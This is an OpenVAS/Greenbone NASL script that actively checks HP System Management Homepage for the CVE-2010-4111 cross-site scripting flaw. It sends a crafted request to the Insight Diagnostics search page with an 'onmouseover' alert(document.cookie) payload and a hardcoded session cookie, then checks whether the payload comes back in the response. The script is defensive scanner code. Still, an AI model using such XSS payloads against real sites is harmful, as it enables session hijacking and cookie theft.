# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:hp:system_management_homepage";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902431");
  script_version("2021-10-14T13:27:28+0000");
  script_tag(name:"last_modification", value:"2021-10-15 09:20:32 +0000 (Fri, 15 Oct 2021)");
  script_tag(name:"creation_date", value:"2011-06-01 11:16:16 +0200 (Wed, 01 Jun 2011)");
  script_cve_id("CVE-2010-4111");
  script_bugtraq_id(45420);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("HP/HPE System Management Homepage (SMH) Insight Diagnostics XSS Vulnerability (HPSBMA02615) - Active Check");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_hp_smh_http_detect.nasl");
  script_mandatory_keys("hp/smh/http/detected");
  script_require_ports("Services/www", 2301, 2381);

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to inject arbitrary
  HTML code in the context of an affected site.");

  script_tag(name:"affected", value:"HP/HPE SMH with Insight Diagnostics Online Edition before version
  8.5.1.3712.");

  script_tag(name:"insight", value:"The flaw is caused due imporper validation of user supplied
  input via 'query=onmouseover=' to the '/frontend2/help/search.php?', which allows attackers to
  execute arbitrary HTML and script code in a user's browser session in the context of an affected
  site.");

  script_tag(name:"solution", value:"Update to version 8.5.1.3712 or later.");

  script_tag(name:"summary", value:"HP/HPE System Management Homepage (SMH) with Insight Diagnostics is
  prone to a cross-site scripting (XSS) vulnerability.");

  script_xref(name:"URL", value:"http://marc.info/?l=bugtraq&m=129245189832672&w=2");
  script_xref(name:"URL", value:"http://securitytracker.com/alerts/2010/Dec/1024897.html");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101636/PR10-11.txt");
  script_xref(name:"URL", value:"https://support.hpe.com/hpesc/public/docDisplay?docLocale=en_US&docId=c02652463");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(port:port, cpe:CPE))
  exit(0);

useragent = http_get_user_agent();
host = http_host_name(port:port);

url = '/hpdiags/frontend2/help/search.php?query="onmouseover="alert(document.cookie);';
req = string("GET ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Cookie: Compaq-HMMD=0001-8a3348dc-f004-4dae-a746-211a6" +
             "d70fd51-1292315018889768; HPSMH-browser-check=done for" +
             " this session; curlocation-hpsmh_anonymous=; PHPSESSID=" +
             "2389b2ac7c2fb11b7927ab6e54c43e64\r\n",
             "\r\n");
res = http_keepalive_send_recv(port:port, data:req);

if(res =~ "^HTTP/1\.[01] 200" && '="alert(document.cookie);"' >< res) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);